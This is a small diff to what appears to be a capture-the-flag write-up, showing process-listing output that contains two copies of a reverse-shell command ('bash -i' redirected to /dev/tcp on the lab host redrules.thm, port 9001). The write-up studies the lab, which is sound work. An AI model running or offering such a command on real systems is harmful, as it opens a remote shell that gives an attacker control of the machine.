@@ -138,6 +138,7 @@ ps -aux --forest
 ```
 ###### Output:
 ```
+.....
 red        16215  0.0  0.1   6972  2612 ?        S    10:56   0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
 red        16234  0.0  0.1   6972  2644 ?        S    10:57   0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
 ```
